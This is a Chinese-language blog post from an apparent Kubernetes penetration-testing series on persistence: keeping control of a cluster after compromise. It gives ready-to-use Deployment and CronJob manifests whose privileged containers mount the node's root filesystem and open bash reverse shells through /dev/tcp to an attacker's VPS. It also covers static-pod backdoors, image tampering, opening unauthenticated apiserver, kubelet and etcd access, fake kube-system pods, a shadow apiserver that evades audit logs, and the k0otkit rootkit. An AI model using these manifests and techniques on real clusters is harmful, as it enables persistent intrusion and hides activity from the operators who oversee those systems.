---
title: "K8s渗透-持久化"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# K8s渗透-持久化

> 文章首发于track安全社区：[K8s渗透入门从零到一](https://bbs.zkaq.cn/t/32483.html)

持久化即权限维持，通过持久化在k8s中留下后门，可以在初始访问的入口点丢掉之后仍然保持对k8s的控制权

## 部署后门容器

在拥有了创建pod的权限后，我们就可以创建一个恶意的pod为我们实现权限维持（即在容器中留下shell），并且在pod中留下能控制node的后门（比如挂载node的根目录）

常见方法如下

### 挂载目录

向创建的pod中挂载一些用于逃逸的目录，在我的逃逸相关文章详细记录了：[K8s渗透-权限提升](https://yuy0ung.github.io/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/)

这里值得一提的是，我们可以使用这个配置：
~~~yaml
restartPolicy: Always
~~~

可以让pod在被关闭后重启

### 使用k8s控制器部署后门容器

在前面 [K8s渗透-执行]() 的文章中，我们部署后门容器的方式是使用yaml文件，而文件中有这样一行：

~~~yaml
kind: Pod
~~~

这代表我们创建的后门容器就是一个单纯的pod，而除此之外还有一类后门是控制器，它能自动创建和控制恶意pod，并且它也基于yaml文件创建，优点是更稳定，其自动创建的pod在被kill后可以被恢复，它的yaml文件格式如下：

~~~yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test-rev
spec:
  replicas: 1
  selector:
    matchLabels:
      app: test-rev
  template:
    metadata:
      labels:
        app: test-rev
    spec:
      nodeName: <节点名称>
      containers:
      - name: test-container
        image: ubuntu
        command: ["/bin/sh"]
        args:
          - "-c"
          - |
            apt update && apt install -y bash netcat-openbsd && \
            bash -c 'while true; do bash -i >& /dev/tcp/<你的vps的公网IP>/2333 0>&1; sleep 60; done'
        volumeMounts:
        - mountPath: /mnt
          name: test-volume
        securityContext:
          privileged: true
      volumes:
      - name: test-volume
        hostPath:
          path: /
~~~

指定yaml文件即可创建：

![QQ_1757005961855](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757005961855.png)

可以通过如下命令可以查看我们部署的控制器：

~~~sh
kubectl get deployments
~~~

![QQ_1757006424193](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006424193.png)

通过deployment部署的pod即使被删除也能自动重建：

![QQ_1757006371754](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757006371754.png)

如果要删除这个控制器，命令如下：

~~~sh
kubectl delete deployment test-rev
~~~

### cronjob持久化

cronjob的作用类似于linux上的crontab，会创建基于时间间隔重复的调度job

job控制器也是k8s的一种内置控制器，用于运行一个或多个Pod来执行任务，yaml文件格式如下：

~~~yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: test-rev-cron
spec:
  schedule: "*/1 * * * *"   # 每分钟执行一次
  jobTemplate:
    spec:
      template:
        spec:
          nodeName: <节点名称>
          restartPolicy: Never
          containers:
          - name: test-container
            image: ubuntu
            command: ["/bin/sh"]
            args:
              - "-c"
              - |
                apt update && apt install -y bash netcat-openbsd && \
                bash -c 'bash -i >& /dev/tcp/<你的vps的公网IP>/2333 0>&1'
            volumeMounts:
            - mountPath: /mnt
              name: test-volume
            securityContext:
              privileged: true
          volumes:
          - name: test-volume
            hostPath:
              path: /
~~~

创建方法也是一样的：

![QQ_1757130951640](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130951640.png)

创建后可以查看是否创建成功：
~~~sh
kubectl --kubeconfig config get cronjob -A
~~~

创建后就可以每分钟收到一次反弹shell：

![QQ_1757130993297](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757130993297.png)

删除也很简单：
~~~sh
kubectl delete cronjob test-rev-cron
~~~

![QQ_1757131261273](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757131261273.png)

## 在容器/镜像内植入后门

### 容器植入后门

这里的即对pod容器进行一些基础的维持，方法和常规linux权限维持相似，可以参考我的这篇文章：[linux权限维持](https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/)

### 向镜像植入后门

如果获取了私有镜像仓库的控制权限，我们便可以尝试向镜像注入恶意代码，常见的方法是修改dockerfile文件，在里面植入恶意的sh命令

## 修改核心文件访问权限

当我们获得了master节点的权限后，也可以通过修改apiserver配置文件来修改组件的访问权限，常用方式如下：

* 开启apiserver不安全端口或安全端口匿名访问
* 配置kubelet 10250端口未授权访问
* 配置etcd未授权
* 配置kube proxy apiserver监听其他端口

## 伪装系统Pod

kube-system是k8s系统相关的所有对象组成的命名空间，包含很多用于管理集群的组件：

![QQ_1757144377550](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757144377550.png)

一般来说这些组件是不会被查看和修改的，所以我们可以在这里面伪造一个系统pod，pod创建的方法和前面一样，只是名字和指定的namespace不同，这里不再赘述

## 部署静态pod

static 是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet 进行管理。在漏洞利用上有以下几点明显的优势：

* 仅依赖于 kubelet：Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用，在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器宿主机节点之上

* 配置目录固定：Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为  /etc/kubernetes/manifests 或  /etc/kubelet.d/，一般情况不做更改。需要注意的是，不同Kubernetes发行版的默认路径可能有所不同，建议在实际环境中进行确认

我们只需要在配置目录如`/etc/kubernetes/manifests`中添加恶意pod的yaml文件即可

我们可以查看`/etc/systemd/system/kubelet.service.d/10-config.conf`中是否有这个配置：

![QQ_1757146611800](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757146611800.png)

没有配置我们可以手动启动这个配置：
~~~sh
kubelet --pod-manifest-path=/etc/kubernetes/manifests
~~~

或在上面截图中的`/var/lib/kubelet/config.yaml`文件中添加一行：
~~~yaml
staticPodPath: /etc/kubernetes/manifests
~~~

## 创建shadow apiserver

思路是创建一个具有apiserver功能的pod，后续命令可以在这个影子apiserver上进行下发，可以绕过k8s的日志审计，不会被原apiserver记录，更加隐蔽

我们可以使用CDK实现，可以看原wiki：https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver
~~~sh
./cdk run k8s-shadow-apiserver default
~~~

shadow apiserver会开启未授权端口，部署完成后我们可以通过kubectl或cdk的kcurl向shadow apiserver下发请求

## k0otkit

绿盟的阮博男师傅分享了一种k8s内的rootkit技术：https://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/

从攻击者的角度来看，k0otkit利用了多种技术和天然优势：

1. DaemonSet和Secret资源（快速持续反弹、资源分离）
2. kube-proxy镜像（就地取材）
3. 动态容器注入（高隐蔽性）
4. Meterpreter（流量加密、持续反弹）
5. 无文件攻击（高隐蔽性）

这个rootkit除了用于权限维持以外，在我们获得master节点的cluster-admin权限也可以用来快速获取所有节点shell，具体的使用方法可以参考github：https://github.com/Metarget/k0otkit
